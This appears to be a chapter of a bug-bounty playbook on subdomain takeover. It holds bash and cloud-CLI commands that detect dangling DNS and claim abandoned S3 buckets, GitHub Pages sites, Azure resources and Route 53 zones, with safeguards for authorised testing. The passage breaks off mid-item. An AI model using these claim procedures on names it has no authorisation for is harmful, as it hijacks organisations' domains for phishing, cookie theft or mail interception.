# STO · Subdomain takeover & dangling DNS

> A DNS record, or a reference in a page, still points at something the organisation gave up: a deleted bucket,
> app or site on a hosting service, a lapsed domain, an emptied DNS zone, a released cloud address. Whoever
> registers that exact name serves content, or receives mail, under the organisation's name. Alone it is a medium
> with a median payout of $300; it reaches critical only when a session cookie, an OAuth redirect allow-list or a
> CORS policy trusts the claimed host.

| | |
|---|---|
| **Class** | `takeover` |
| **Applies when** | cname-3p\|dangling\|cloud-storage\|http |
| **Pays** | 178 disclosed reports filed under the class (32 more touch it), 27 paid, median $300, top $3,000. Where the title names the service, the best-paid were Fastly (#154425, $3,000), CloudFront (#352869, $1,000), Heroku (#424669) and S3 (#207576) at $500; two reports that carried a takeover into an authentication bypass were rated critical (#219205, #335330). |
| **Weaknesses** | Misconfiguration · Privilege Escalation · Improper Access Control - Generic · Inclusion of Functionality from Untrusted Control Sphere · Externally Controlled Reference to a Resource in Another Sphere · Improper Authentication - Generic · CWE-672, CWE-269, CWE-284, CWE-829, CWE-610, CWE-287 |

## Why it pays

Organisations point DNS at things that live elsewhere: a GitHub Pages site, a Heroku app, an S3 bucket, an Azure
web app, a Zendesk help centre, a zone delegated to Route 53, a mail service. When the thing is deleted and the
record is not, the name points at an empty slot that anyone with an account at that service can fill. That is the
whole bug, and programmes pay for it accordingly: 151 of the 178 disclosed reports filed under the class show no
bounty, and the paid median is $300. Where the title names the service, the best-paid were Fastly (#154425,
$3,000), CloudFront (#352869, $1,000), Heroku (#424669, $500) and S3 (#207576, $500); a name whose DNS was
delegated to an outside party paid $1,500 (#376808).

Severity follows what trusts the name, not the claim itself. #219205 (rated critical) took over a sibling of
Uber's login host and so received the single sign-on cookies scoped to `*.uber.com`; #335330 and #172137 are
titled the same way, takeover to authentication bypass. Before a takeover report goes in, check what trusts the
claimed host: a session cookie scoped to the parent domain (STO-010), an OAuth `redirect_uri` allow-list, a CORS
policy, a CSP script source.

The second form needs no record of the organisation's at all. A page loads script from a domain that lapsed, or
from a bucket that was deleted, and whoever registers it runs code in the application's origin: #1598347 was
stored XSS on www.hackerone.com through a deleted S3 bucket, #152584 ($1,000) an S3 bucket takeover, and
#1590794 ($6,909) used a lapsed domain left in a CSP `form-action` as one link of a chain. What does not pay: an
unclaimed page without a claim, a scanner line, a silent cloud address, and links to deleted social-media handles
(27 broken-link reports in the index, one paid, $100). Continuous subdomain monitors look for exactly this class,
so on a public wildcard programme assume a name that has dangled for weeks was reported already; run STO-001 and
STO-002 first, and claim and report the same hour.

## The crux question

**Does a DNS record or a page of the organisation still point at a name, bucket, zone or address that the
organisation no longer holds, and can I register that exact name in an account of my own?**

## Applicability probe

The fingerprinter settles `cname-3p` on every named host (a CNAME into its list of hosting and SaaS suffixes, `0`
otherwise) and sets `dangling` when that CNAME does not resolve or the page matches a service's unclaimed text;
`cloud-storage` comes from bucket host names in responses and bundles. Three cases need a hand probe: a name with
no answer at all (tiered `dead`, `dangling` left unknown), a CNAME into a service the suffix list does not know,
and a service reached through A records instead of a CNAME (an apex on GitHub Pages' `185.199.108.153` to
`185.199.111.153`, a flattened ALIAS record). Set `cname-3p=1` by hand for the last two. `dangling` is never set
to `0` automatically: write it when STO-001 or STO-002 finds the resource in use, so the claim items close.
`takeover-ok` comes from the policy text and is set on `@eng`.

```bash
source "$E/env.sh"
# 1. the answer for the name: status line, CNAME chain, addresses
dig +noall +comments +answer "$H" A | grep -E 'status:|[[:space:]]IN[[:space:]]+(CNAME|A)[[:space:]]'
# 2. the last name in the CNAME chain, and whether it resolves
TGT=$(dig +short "$H" A | grep -vE '^[0-9.]+$' | tail -1 | sed 's/\.$//')
[ -n "$TGT" ] && dig +noall +comments "$TGT" A | grep -oE 'status: [A-Z]+'
# 3. a name with no answer: SERVFAIL or REFUSED is a delegation whose servers do not serve the zone (STO-005);
#    NXDOMAIN whose SOA owner is a TLD or another public suffix may be an unregistered domain (STO-004)
dig +noall +comments +authority SOA "${TGT:-$H}" | grep -E 'status:|[[:space:]]SOA[[:space:]]'
# 4. who owns the addresses of a name that has A records only (a hosting service reached without a CNAME)
for ip in $(dig +short A "$H" | grep -E '^[0-9.]+$'); do whois "$ip" | grep -m1 -iE '^(orgname|org-name|netname):'; done
# 5. bucket host names in what the fingerprint saved
grep -rhoiE '[a-z0-9.-]+\.s3[.-][a-z0-9.-]*amazonaws\.com|storage\.googleapis\.com/[a-z0-9._-]+|[a-z0-9-]+\.blob\.core\.windows\.net|[a-z0-9.-]+\.digitaloceanspaces\.com' \
  "$E/recon/$H/" 2>/dev/null | sort -u | head
```

```bash
scripts/sane fact set "$H" cname-3p=1 --ev "CNAME acme.gitbook.io (GitBook): not in the fingerprinter's suffix list"
scripts/sane fact set "$H" cname-3p=1 --ev "A records 185.199.108.153 to .111.153 (GitHub Pages), no CNAME"
scripts/sane fact set "$H" dangling=1 --ev "SERVFAIL; the parent delegates to four ns-*.awsdns-* servers, each REFUSED for the zone"
scripts/sane fact set "$H" dangling=1 --ev "NXDOMAIN, SOA owner com.; RDAP 404 for oldbrand.com"
scripts/sane fact set "$H" dangling=0 --ev "CNAME target resolves and serves the organisation's own site"
scripts/sane fact set "$H" cloud-storage=1 --ev "main.js loads https://acme-widgets.s3.amazonaws.com/w.js"
scripts/sane fact set @eng takeover-ok=1 --ev "policy: 'subdomain takeovers are eligible; claim with a page that shows your username'"
```

With `http=0`, `cname-3p=0`, `dangling=0` and `cloud-storage=0` the chapter closes for the asset and the planner
writes the reason. A host that answers HTTP keeps STO-008 even when its own records are sound: its pages may load
from lapsed domains. STO-006, STO-007 and STO-010 run once per programme, on the asset `@programme`, and need no
fact about a single host.

## Triage order

STO-002 (the fingerprinter already flagged the NXDOMAIN target; one availability call) → STO-001 (one GET and a
string match per third-party CNAME) → STO-003 (claim what either found, the same hour) → STO-010 (what trusts the
claimed host) → STO-005 (dead delegations: few names, a whole zone) → STO-004 (unregistered domains behind dead
names) → STO-009 (bucket names the pages use) → STO-008 (script and frame sources on lapsed domains) → STO-006
(MX sweep, once per programme) → STO-007 (cloud addresses, once per programme; rarely provable).

## Items

### STO-001 · The host's CNAME points at a hosting or SaaS service that answers for this name with its unclaimed-resource page

| | |
|---|---|
| **Severity** | None standalone; Medium once STO-003 claims it; High or Critical with STO-010 |
| **Requires** | cname-3p, http, !ip |
| **Excluded by** | takeover |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #154425, #424669, #382995, #810807 |

- **Where:** names whose CNAME chain ends at a service where a customer picks the name or binds a custom domain;
  the fingerprint's `cname-3p` evidence names the service. An apex reaches the same services through A records or
  a flattened ALIAS (GitHub Pages' `185.199.108.153` to `.111.153`); the probe sets `cname-3p` by hand for those.
  The services below show a distinctive page when nothing is bound to the name. Names whose target does not
  resolve at all are STO-002.
- **Test:** fetch the name over HTTPS and HTTP, and a random path, and match the bodies against the service's
  unclaimed text. Then read the service's row in can-i-take-over-xyz (EdOverflow, on GitHub): it records whether a
  name on that service can still be claimed (`Vulnerable`, `Edge case`, `Not vulnerable`) and links the
  discussion of how. The string says the resource is gone; only that row, and in the end STO-003, says whether
  anyone can take its place.
- **How:**
  ```text
  GitHub Pages   <owner>.github.io                         There isn't a GitHub Pages site here.
  Heroku         <app>.herokuapp.com, <id>.herokudns.com   No such app  /  herokucdn.com/error-pages/no-such-app.html
  AWS S3         <bucket>.s3[.-]<region>.amazonaws.com     <Code>NoSuchBucket</Code> ... <BucketName>the name</BucketName>
                 <bucket>.s3-website[.-]<region>.amazonaws.com
  Fastly         *.fastly.net                              Fastly error: unknown domain: <host>
  Shopify        shops.myshopify.com                       Sorry, this shop is currently unavailable.
  Zendesk        <sub>.zendesk.com                         Help Center Closed
  ReadMe         <project>.readme.io                       Project doesnt exist... yet!
  Netlify        <site>.netlify.app                        Not Found - Request ID:
  Surge          *.surge.sh                                project not found
  Pantheon       *.pantheonsite.io                         404 error unknown site!
  Tumblr         domains.tumblr.com                        Whatever you were looking for doesn't currently exist at this address.
  Unbounce       unbouncepages.com                         The requested URL was not found on this server.   (generic text: needs the CNAME too)
  Ghost          *.ghost.io                                The thing you were looking for is no longer here, or never was
  Help Scout     *.helpscoutdocs.com                       No settings were found for this company:
  UserVoice      *.uservoice.com                           This UserVoice subdomain is currently available!
  Webflow        proxy-ssl.webflow.com                     The page you are looking for doesn't exist or has been moved.
  WordPress.com  *.wordpress.com                           Do you want to register *.wordpress.com?
  Bitbucket      *.bitbucket.io                            Repository not found
  ```
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/STO-001"; mkdir -p "$D"
  dig +noall +answer "$H" A | tee "$D/dig.txt"                    # the CNAME chain and addresses, saved for the report
  for s in https http; do
    curl -sS "${HDR[@]}" -k --max-time 15 -D "$D/$s.hdr" -o "$D/$s.body" -w "$s / %{http_code} %{size_download}\n" "$s://$H/"
    curl -sS "${HDR[@]}" -k --max-time 15 -o "$D/$s-random.body" -w "$s random %{http_code}\n" "$s://$H/sto$RANDOM$RANDOM"
  done
  grep -HoE "There isn't a GitHub Pages site here|<Code>NoSuchBucket</Code>|<BucketName>[^<]+|No such app|no-such-app|Fastly error: unknown domain|Sorry, this shop is currently unavailable|Help Center Closed|Project doesnt exist\.\.\. yet|Not Found - Request ID|project not found|404 error unknown site|Whatever you were looking for doesn't currently exist|There's nothing here|The thing you were looking for is no longer here|No settings were found for this company|This UserVoice subdomain is currently available|Do you want to register|Repository not found|The page you are looking for doesn't exist or has been moved" "$D"/*.body
  # the service's row in the reference list: status and the discussion of how a claim works
  SVC=$(jq -r '."cname-3p".ev // empty' "$E/facts/$H.json" | sed -E 's/.*\(([^)]*)\)$/\1/'); echo "service: $SVC"
  gh api repos/EdOverflow/can-i-take-over-xyz/readme --jq .content | base64 -d | grep -iF "${SVC%% *}" | head -8
  # a second opinion only: a template match is never the evidence
  nuclei -u "$T" -tags takeover -type http -rl "$RATE" -c 2 -retries 0 -ni $HDRF -jsonl -o "$D/nuclei.jsonl"
  ```
- **Proof:** none on its own. The saved `dig` chain and the matching body, next to the can-i-take-over-xyz row
  that calls the service claimable, make a candidate; the report needs the claim (STO-003).
- **Not a finding when:** the page is the service's ordinary answer for a site that exists: GitHub Pages' "404
  File not found" for a missing file, S3 `NoSuchKey` or `AccessDenied`, an app's own error page; only the owner
  can change those. The service is `Not vulnerable` in the reference list, or binds a custom name only after a
  verification record on the organisation's zone: CloudFront's "Bad request" page is the common case (a
  distribution needs a certificate covering the name). The text is generic (Unbounce's, and any "not found") and
  nothing else ties the name to the service. A wildcard record (`*.example.com CNAME ...`) makes every random
  name match: one root cause, one report. The host is excluded in the scope table even though a wildcard covers
  its parent.
- **Escalate:** STO-003 for the claim, the same hour. Record the outcome so the planner queues or closes it:
  `scripts/sane fact set "$H" dangling=1 --ev "https / answers 'No such app' (Heroku); listed Vulnerable"`, or
  `dangling=0` with what the page really is. Several names on one deleted resource or one wildcard are one report
  listing each host.

### STO-002 · The host's CNAME names an Azure or Elastic Beanstalk resource that no longer exists, and the provider offers that name to new customers

| | |
|---|---|
| **Severity** | None standalone; Medium once STO-003 claims it; High or Critical with STO-010 |
| **Requires** | cname-3p, dangling, !http, !ip |
| **Excluded by** | takeover |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #325336, #388622 |

- **Where:** names whose last CNAME target returns NXDOMAIN under a provider zone where the customer chooses the
  label: Azure `<label>.azurewebsites.net` (App Service), `<label>.trafficmanager.net` (Traffic Manager),
  `<label>.blob.core.windows.net` (Storage), `<label>.<region>.cloudapp.azure.com` (public IP DNS label),
  `<label>.azureedge.net` (CDN), `<label>.azure-api.net` (API Management), `<label>.cloudapp.net` (Cloud Services
  classic); AWS Elastic Beanstalk `<prefix>.<region>.elasticbeanstalk.com`. The fingerprinter has already set
  `cname-3p` and `dangling` for these, so they are the cheapest takeovers to confirm.
- **Test:** NXDOMAIN under the provider's zone means the resource was deleted. The label can be taken only if the
  provider still lets a new customer create it in that form, so ask the provider: each of these has a read-only
  availability call, made from our own subscription or account. Elastic Beanstalk names carry the region and must
  be re-created there; the older region-less form `<prefix>.elasticbeanstalk.com` is not offered by
  `check-dns-availability`, so treat it as not claimable unless the reference list says otherwise.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/STO-002"; mkdir -p "$D"
  TGT=$(dig +short "$H" A | grep -vE '^[0-9.]+$' | tail -1 | sed 's/\.$//'); N=${TGT%%.*}; echo "target $TGT, label $N"
  dig +noall +comments "$TGT" A | grep -oE 'status: [A-Z]+' | tee "$D/status.txt"            # expect NXDOMAIN
  dig +noall +answer "$H" CNAME | tee "$D/dig.txt"
  SUB=$(az account show --query id -o tsv 2>/dev/null)
  case "$TGT" in
    *.trafficmanager.net)    az network traffic-manager profile check-dns --name "$N" ;;
    *.blob.core.windows.net) az storage account check-name --name "$N" ;;
    *.azureedge.net)         az cdn name-exists --name "$N" ;;
    *.azure-api.net)         az apim check-name --name "$N" ;;
    *.azurewebsites.net)     az rest --method post --url "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Web/checknameavailability?api-version=2022-03-01" \
                               --body "{\"name\":\"$N\",\"type\":\"Microsoft.Web/sites\"}" ;;
    *.cloudapp.azure.com)    LOC=$(echo "$TGT" | awk -F. '{print $(NF-3)}')
                             az rest --method get --url "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Network/locations/$LOC/CheckDnsNameAvailability?domainNameLabel=$N&api-version=2023-09-01" ;;
    *.elasticbeanstalk.com)  REG=$(echo "$TGT" | grep -oE '\.[a-z]{2}-[a-z]+-[0-9]\.' | tr -d .)
                             if [ -n "$REG" ]; then aws elasticbeanstalk check-dns-availability --cname-prefix "$N" --region "$REG"
                             else echo "region-less legacy name: not offered by check-dns-availability"; fi ;;
    *) echo "no availability call for $TGT: read the provider's row in can-i-take-over-xyz" ;;
  esac | tee "$D/availability.json"                                                         # nameAvailable / Available: true
  ```
- **Proof:** none on its own: NXDOMAIN for the target, the CNAME in `dig`, and the provider answering that the
  exact label is available, all saved with the time. The report needs the claim (STO-003).
- **Not a finding when:** the provider says the name is taken: another customer or the organisation re-created it
  (if the name now resolves and serves someone else, that is STO-007's evidence, not a claim). The label is one
  the provider generates (CloudFront `d<id>.cloudfront.net`, Heroku `<id>.herokudns.com`, Azure Front Door
  endpoints with a hash suffix): nobody can choose it. The resource type is retired: Azure Cloud Services
  (classic), behind `*.cloudapp.net`, was retired in 2024, so a name there counts only if a subscription can still
  create one. The target answers SERVFAIL rather than NXDOMAIN: an outage or a dead delegation (STO-005), not a
  deleted resource.
- **Escalate:** STO-003: create the resource under that label, in the same region, and bind `$H`. If the provider
  asks for a verification TXT record before it binds a custom name (App Service asks for one at `asuid.<name>`),
  the claim stops there: record `negative` with the error text. Several names on the same deleted resource are one
  report.

### STO-003 · The unclaimed name can be registered in our own account and serves an inert proof file under the organisation's host name

| | |
|---|---|
| **Severity** | Medium standalone: anyone can publish under the organisation's host name; High with STO-010 or another trust in the host (an OAuth redirect allow-list, CORS, CSP); Critical when STO-010 shows the organisation's single sign-on session reaching it |
| **Requires** | cname-3p, dangling, takeover-ok, !ip |
| **Excluded by** | takeover |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #779442, #1474784, #2899858, #863551 |

- **Where:** a host where STO-001 or STO-002 found the resource deleted and the service claimable. Read the policy
  sentence first: `takeover-ok` records that claims are allowed; a policy that says "do not claim" ends this card
  at the STO-001 or STO-002 evidence, and a policy that prescribes the proof page's content overrides the one
  below. Everything is created in the operator's own account at the service; anything we name ourselves starts
  with `h1-<username>-sto`, so the programme can recognise it and the clean-up can find it.
- **Test:** register the exact name, bind `$H` to it, and serve one inert page at an unguessable path and nothing
  else: nothing at `/`, no redirect, no script, no external resource, no form, no access log switched on, no
  certificate requested by us. Platforms that issue a certificate on their own (GitHub Pages does) put it in the
  Certificate Transparency logs: say so in the report. Capture, report the same hour, release as the policy says.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/STO-003"; mkdir -p "$D"
  U=$(jq -r '.authorisation.h1_username' "$E/engagement.json"); R=$(openssl rand -hex 16)
  cat > "$D/$R.html" <<EOF
  <!doctype html><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><title>$R</title>
  <!-- subdomain takeover proof for $H by HackerOne user $U, $(date -u +%FT%TZ); nothing else is served on this host -->
  <p>$H takeover proof $R</p>
  EOF
  dig +noall +answer "$H" A > "$D/dig-before.txt"
  ```
  ```bash
  # AWS S3 (NoSuchBucket in STO-001): the bucket is the <BucketName> the error printed; the region is in the CNAME
  BK=$(grep -ohE '<BucketName>[^<]+' "$E/evidence/$H/STO-001/"*.body | head -1 | cut -d'>' -f2)
  REG=$(dig +short CNAME "$H" | grep -oE 's3[.-](website[.-])?[a-z]{2}-[a-z]+-[0-9]' | grep -oE '[a-z]{2}-[a-z]+-[0-9]' || echo us-east-1)
  aws s3api create-bucket --bucket "$BK" --region "$REG" $([ "$REG" = us-east-1 ] || echo "--create-bucket-configuration LocationConstraint=$REG")
  aws s3api put-public-access-block --bucket "$BK" --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=false,RestrictPublicBuckets=false
  aws s3api put-bucket-policy --bucket "$BK" --policy "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$BK/$R.html\"}]}"
  aws s3 cp "$D/$R.html" "s3://$BK/$R.html" --content-type text/html
  aws s3 website "s3://$BK" --index-document "absent-$R.html"      # only for an s3-website CNAME; / stays a 404
  ```
  ```bash
  # GitHub Pages: a new public repository holding only the CNAME file and the proof
  mkdir -p "$D/gh" && cd "$D/gh" && git init -q -b main && printf '%s\n' "$H" > CNAME && cp "$D/$R.html" . && touch .nojekyll
  git add -A && git commit -qm "takeover proof $R" && gh repo create "h1-$U-sto-$R" --public --source . --push
  gh api -X POST "repos/{owner}/h1-$U-sto-$R/pages" -f 'source[branch]=main' -f 'source[path]=/'
  gh api -X PUT "repos/{owner}/h1-$U-sto-$R/pages" -f "cname=$H"    # an error here (domain verified by another account) ends the claim
  ```
  ```bash
  # Azure (STO-002 found the label free): create the resource under that label, then bind $H to it
  N=$(dig +short "$H" A | grep -vE '^[0-9.]+$' | tail -1 | cut -d. -f1); az group create -n "h1-$U-sto" -l westeurope
  #   Storage, *.blob.core.windows.net: Azure accepts the custom domain because the CNAME already points at the account
  az storage account create -g "h1-$U-sto" -n "$N" --sku Standard_LRS --https-only false --allow-blob-public-access true
  az storage account update -g "h1-$U-sto" -n "$N" --custom-domain "$H"
  az storage container create --account-name "$N" -n '$root' --public-access blob
  az storage blob upload --account-name "$N" -c '$root' -n "$R.html" -f "$D/$R.html" --content-type text/html
  #   Traffic Manager, *.trafficmanager.net: the profile answers with an endpoint we name. $OOB must be a server we run
  #   that answers /$R.html for any Host header and 404 for everything else
  az network traffic-manager profile create -g "h1-$U-sto" -n "h1-$U-sto-tm" --unique-dns-name "$N" --routing-method Priority --ttl 30
  az network traffic-manager endpoint create -g "h1-$U-sto" --profile-name "h1-$U-sto-tm" -n proof --type externalEndpoints --target "$OOB" --priority 1
  ```
  Elastic Beanstalk: an environment created with `--cname-prefix` equal to the free prefix, in the CNAME's region,
  running a bundle that serves only the proof file (the platform's sample application serves a page at `/`: never
  deploy it). Heroku: `heroku create` with the app name from the CNAME and `heroku domains:add "$H"`; Heroku has no
  free plan, so the operator decides on the cost first. Any other service: the claim steps in its
  can-i-take-over-xyz discussion; the proof file, the rules and the capture do not change.
  ```bash
  # capture: the proof under $H, nothing at /, the DNS chain, a screenshot; then report (PB-11) the same hour
  curl -sS "${HDR[@]}" -D "$D/proof.hdr" -o "$D/proof.body" -w '%{http_code} %{url_effective}\n' "http://$H/$R.html"; grep -c "$R" "$D/proof.body"
  curl -sS "${HDR[@]}" -o /dev/null -w 'root: %{http_code}\n' "http://$H/"
  dig +noall +answer "$H" A | tee "$D/dig-after.txt"
  npx --yes playwright screenshot --full-page "http://$H/$R.html" "$D/proof.png"
  printf '%s /%s.html claimed %s\n' "$H" "$R" "$(date -u +%FT%TZ)" | tee "$D/claimed.txt" >> "$E/cleanup.md"
  ```
- **Proof:** `http://$H/<32 hex>.html` returning our page from the service (status, headers and body saved), the
  `dig` chain showing `$H` resolving to that service, `/` answering 404 or 403, the screenshot with the host name
  in the page text, and the time. In the report: the service, how the resource came to be unclaimed (deleted app,
  bucket, site), the claim steps, and that the resource will be released or handed over as the programme wishes.
- **Not a finding when:** the binding is refused (the domain is verified by another account, needs a TXT or
  `_acme-challenge` record on the organisation's zone, or is reserved): nothing was taken over; record `negative`
  with the refusal text. The proof appears only on the service's own name (`h1-....github.io`), not under `$H`.
  Another researcher's proof already sits on the host: the name is claimed and the report would be a duplicate;
  touch nothing and tell the operator. The service charges for the plan that binds custom names and the operator
  declines: stop at the STO-001 or STO-002 evidence and report only where the policy accepts unclaimed takeovers.
  The host is outside the scope table even though a wildcard covers its parent.
- **Escalate:** with the claim live, STO-010 (a parent-domain session cookie) and, from requests to the main
  application only: an OAuth client or authorization server that accepts any subdomain as `redirect_uri`
  (OAU-001), a CORS policy that trusts `*.<parent domain>` with credentials (COR items), a CSP that allows scripts
  from the host (XSS-015). The claimed host can also set cookies for the parent domain: session fixation
  (AUT-016), a cookie the application writes into its pages (XSS-016). Describe each from the main application's
  responses; never serve the page that would exploit them. Release the resource when the programme confirms (or
  at once if the policy says so) and record the time in `$E/cleanup.md`.

### STO-004 · A CNAME target, or an in-scope domain, sits on a registrable domain that is not registered and can be bought

| | |
|---|---|
| **Severity** | Medium standalone: buying the domain gives control of every name the organisation's records point into, certificates included; High for an in-scope apex or a domain the applications still send mail to, load from or trust; High or Critical with STO-010 |
| **Requires** | dangling, !cname-3p, !http, !ip |
| **Excluded by** | takeover |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #1312365, #321699 |

- **Where:** names whose CNAME target returns NXDOMAIN outside any hosting provider's zone (a vendor's old domain,
  a typo in the target, a campaign domain that lapsed), and in-scope names that return NXDOMAIN themselves (an apex
  listed in the scope whose registration expired). The applicability probe flags both: the SOA in the authority
  section of the NXDOMAIN answer belongs to a TLD or another public suffix, not to a registered domain.
- **Test:** the registrable domain is the label just under the zone that answered (`vendor.com` under `com`,
  `vendor.co.uk` under `co.uk`). Ask the registry whether it exists. RDAP 404 (or whois "No match") means anyone
  can register it; a record with any status means it is still held, even with no DNS at all.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/STO-004"; mkdir -p "$D"
  N=$(dig +short "$H" A | grep -vE '^[0-9.]+$' | tail -1 | sed 's/\.$//'); N=${N:-$H}   # the dead target, or the name itself
  dig +noall +answer "$H" A > "$D/dig.txt"
  dig +noall +comments +authority SOA "$N" | tee "$D/soa.txt" | grep -E 'status:|[[:space:]]SOA[[:space:]]'
  Z=$(awk '$4=="SOA"{print $1; exit}' "$D/soa.txt" | sed 's/\.$//'); [ -n "$Z" ] || echo "no SOA: not an NXDOMAIN case"
  DOM=$(echo "$N" | awk -F. -v z="$Z" '{n=split(z, a, "."); print $(NF-n) "." z}'); echo "zone $Z, registrable $DOM"
  # the zone must not be a registered domain itself (then the dead name lives inside someone's zone), the domain must be absent
  for x in "$Z" "$DOM"; do
    curl -sS "${HDR[@]}" -L -o "$D/rdap-$x.json" -w "rdap $x %{http_code} %{url_effective}\n" "https://rdap.org/domain/$x"; sleep 1
  done
  jq -r '(.status // []) | join(", ")' "$D/rdap-$DOM.json" 2>/dev/null       # any status (client hold, pending delete...) = still held
  whois "$DOM" | tee "$D/whois.txt" | grep -iE 'no match|not found|no data found|status:|expir|registrar:' | head
  ```
  When the redirect stays on rdap.org, the TLD has no RDAP service (many ccTLDs): whois is the evidence. Buying
  the domain costs money and makes the operator the owner of a name the organisation used: do it only with
  `takeover-ok`, the operator's approval of the cost and a plan to transfer it or let it lapse. Then publish only
  the record the dead name needs, pointing at a server we run that serves STO-003's proof page at an unguessable
  path and nothing else: no MX, no wildcard, no certificate. Without a purchase, the RDAP and whois answers are the
  evidence, and a triager can repeat both in a minute.
- **Proof:** the record chain from `dig`, the NXDOMAIN answer whose SOA is the public suffix, RDAP 404 for the
  domain (and the whois text) at the same minute, and a non-200 RDAP answer for the zone above it; with a
  purchase, `http://$H/<hex>.html` serving our page as in STO-003.
- **Not a finding when:** RDAP returns the domain with a status (`client hold`, `server hold`, `redemption
  period`, `pending delete`): it is registered and not for sale, and pending-delete names go to drop-catching
  services, not to us. The domain is registered and parked or offered for sale by a reseller (the name resolves to
  a parking page): someone else holds it; report only where the policy takes lost-domain findings, without buying
  it. The zone that answered is a registered domain (RDAP 200 for `$Z`): the missing name lives in a vendor's zone
  and cannot be bought (`third-party` if the vendor's records are the problem). The TLD is restricted (`.gov`,
  `.edu`, `.mil`, ccTLDs that need a local presence): say so in the note. The only evidence is a registrar's
  search page: those list premium and reserved names as available.
- **Escalate:** a lapsed in-scope apex is wider than one host: its MX (password-reset mail for accounts with
  addresses on it), the OAuth redirect URIs and CSP sources that name it, and links in the applications. Describe
  them from the applications' responses (STO-008 finds the references); never register addresses or receive mail
  for real users. STO-010 when the dead name sits under the parent domain of a session cookie.

### STO-005 · A zone delegated to a cloud DNS provider no longer exists there, and creating it in our account puts it on the delegated name servers

| | |
|---|---|
| **Severity** | High standalone: whoever holds the zone answers for every name in it, web, mail and certificate validation included; Critical with STO-010 when the zone sits under the domain of a session cookie |
| **Requires** | dangling, !cname-3p, !http, !ip, takeover-ok |
| **Excluded by** | takeover |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Misconfiguration · CWE-672 |
| **Prior art** | #376808, #746000, #1342422, #794382 |

- **Where:** names that answer SERVFAIL or REFUSED (the probe's third command), and every name under a label that
  does. The delegation lives in the parent zone: NS records for, say, `dev.example.com` pointing at Route 53
  (`ns-NNN.awsdns-NN.com|net|org|co.uk`), Azure DNS (`ns1-NN.azure-dns.com|net|org|info`), Google Cloud DNS
  (`ns-cloud-XN.googledomains.com`), DigitalOcean (`ns1.digitalocean.com`) or another DNS host. One zone is one
  report listing every host under it.
- **Test:** ask each delegated server for the zone's SOA without recursion. REFUSED or SERVFAIL from all of them
  means no account serves the zone on those servers. Providers assign name servers when a zone is created: on a
  fixed-set host (DigitalOcean, Linode) whoever adds the zone gets the delegated servers; on a pooled host (Route
  53, Azure, Google) each new zone gets a set drawn from a pool, and the zone is ours only if that set overlaps the
  delegation, which can take many attempts.
- **How:**
  ```bash
  source "$E/env.sh"; D="$E/evidence/$H/STO-005"; mkdir -p "$D"
  # 1. the closest delegation at or above $H, read from the parent zone's own server
  n="$H"; Z=""; while [ -z "$Z" ] && [ "${n#*.}" != "$n" ]; do
    p="${n#*.}"; pns=$(dig +short NS "$p" | head -1)
    if [ -n "$pns" ] && dig +norec +noall +authority NS "$n" @"$pns" | grep -qE '[[:space:]]NS[[:space:]]'; then Z="$n"; fi
    n="$p"; done
  dig +norec +noall +authority NS "$Z" @"$pns" | tee "$D/delegation.txt"
  # 2. every delegated server, asked for the zone directly
  for ns in $(awk '$4=="NS"{print $5}' "$D/delegation.txt"); do
    printf '%s ' "$ns"; dig +norec +noall +comments SOA "$Z" @"$ns" | grep -oE 'status: [A-Z]+'; done | tee "$D/lame.txt"
  dig +short DS "$Z" | tee "$D/ds.txt"                         # a DS record here means validating resolvers will reject our zone
  ```
  ```bash
  # 3. Route 53: create the zone, keep it only if its servers overlap the delegation, else delete it and retry.
  #    A hosted zone deleted within 12 hours is not billed. MAX is the attempt budget the operator sets.
  MAX=50; hit=""
  for i in $(seq 1 "$MAX"); do
    out=$(aws route53 create-hosted-zone --name "$Z" --caller-reference "h1-sto-$(date +%s)-$i" --hosted-zone-config Comment=h1-takeover-proof) || break
    id=$(echo "$out" | jq -r '.HostedZone.Id')
    hit=$(comm -12 <(echo "$out" | jq -r '.DelegationSet.NameServers[]' | tr 'A-Z' 'a-z' | sort) \
                   <(awk '$4=="NS"{print tolower($5)}' "$D/delegation.txt" | sed 's/\.$//' | sort))
    [ -n "$hit" ] && { echo "zone $id answers on: $hit" | tee "$D/zone.txt"; break; }
    aws route53 delete-hosted-zone --id "$id" > /dev/null; sleep 10
  done
  # other hosts, same keep-or-delete rule on the name servers they print:
  #   doctl compute domain create "$Z"                          (DigitalOcean: one fixed set; "already exists" = held)
  #   gcloud dns managed-zones create "h1-sto-$i" --dns-name="$Z." --description=h1-takeover-proof
  #   az network dns zone create -g "h1-sto" -n "$Z" --query nameServers -o tsv
  ```
  ```bash
  # 4. the proof is one TXT record at an unguessable label; nothing at the zone apex beyond the provider's SOA and NS
  U=$(jq -r '.authorisation.h1_username' "$E/engagement.json"); R=$(openssl rand -hex 16)
  aws route53 change-resource-record-sets --hosted-zone-id "$id" --change-batch "{\"Changes\":[{\"Action\":\"CREATE\",\"ResourceRecordSet\":{\"Name\":\"sto-$R.$Z\",\"Type\":\"TXT\",\"TTL\":60,\"ResourceRecords\":[{\"Value\":\"\\\"h1-$U takeover proof\\\"\"}]}}]}"
  sleep 60; dig +short TXT "sto-$R.$Z" @1.1.1.1 | tee "$D/proof.txt"; dig +short TXT "sto-$R.$Z" @8.8.8.8 | tee -a "$D/proof.txt"
  printf '%s zone %s (%s) TXT sto-%s %s\n' "$H" "$Z" "$id" "$R" "$(date -u +%FT%TZ)" | tee "$D/claimed.txt" >> "$E/cleanup.md"
  ```
  Run step 4 only when step 3 printed a match. A web proof, where the programme wants one, is an A record for the
